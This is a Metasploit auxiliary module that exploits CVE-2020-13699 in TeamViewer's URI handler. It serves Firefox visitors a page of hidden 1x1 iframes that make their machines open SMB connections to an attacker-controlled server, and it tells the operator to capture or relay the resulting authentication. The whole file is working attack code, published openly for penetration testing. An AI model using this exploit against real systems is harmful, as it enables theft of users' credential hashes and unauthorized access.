##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'TeamViewer Unquoted URI Handler SMB Redirect',
        'Description' => %q{
          This module exploits an unquoted parameter call within the Teamviewer
          URI handler to create an SMB connection to an attacker controlled IP.
          TeamViewer < 8.0.258861, 9.0.258860, 10.0.258873, 11.0.258870,
          12.0.258869, 13.2.36220, 14.2.56676, 14.7.48350, and 15.8.3 are
          vulnerable.
          Only Firefox can be exploited by this vulnerability, as all other
          browsers encode the space after 'play' and before the SMB location,
          preventing successful exploitation.
          Teamviewer 15.4.4445, and 8.0.16642 were succssfully tested against.
        },
        'Author' => [
          'Jeffrey Hofmann <me@jeffs.sh>', # Vuln discovery, PoC, etc
          'h00die' # msf module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'URL', 'https://jeffs.sh/CVEs/CVE-2020-13699.txt' ],
          [ 'CVE', '2020-13699' ],
          [ 'URL', 'https://community.teamviewer.com/t5/Announcements/Statement-on-CVE-2020-13699/td-p/98448' ]
        ],
        'Notes' => {
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('FILE_NAME', [false, 'Arbitrary tv file location', '\\teamviewer\\config.tvs']),
        OptString.new('SMB_SERVER', [true, 'SMB server IP address', '']),
        OptEnum.new('URI_HANDLER', [
          true, 'TeamViewer URI Handler', 'teamviewer10', [
            'teamviewer10',
            'teamviewer8', 'teamviewerapi', 'tvchat1', 'tvcontrol1', 'tvfiletransfer1', 'tvjoinv8',
            'tvpresent1', 'tvsendfile1', 'tvsqcustomer1', 'tvsqsupport1', 'tvvideocall1', 'tvvpn1'
          ]
        ])
      ]
    )
  end

  def html_content
    # For some reason, tends to work best when double iframes.  Single will pop up the 'open app' message, but tends to not connect.
    %(
    <html>
    <head></head>
    <body>
      <iframe style="height:1px;width:1px;" src="#{datastore['URI_HANDLER']}: --play \\\\#{datastore['SMB_SERVER']}#{datastore['FILE_NAME']}"></iframe>
      <iframe style="height:1px;width:1px;" src="#{datastore['URI_HANDLER']}: --play \\\\#{datastore['SMB_SERVER']}#{datastore['FILE_NAME']}"></iframe>
    </body>
    </html>
    )
  end

  def on_request_uri(cli, req)
    print_status("Request received for: #{req.uri}")

    ua = req.headers['User-Agent'].to_s

    unless ua.include?('Firefox')
      print_error('Target is not Firefox')
      return
    end

    print_status("Sending TeamViewer Link to #{ua}...")
    send_response_html(cli, html_content)
  end

  def run
    print_good("Please start an SMB capture/relay on #{datastore['SMB_SERVER']}")
    exploit
  end
end
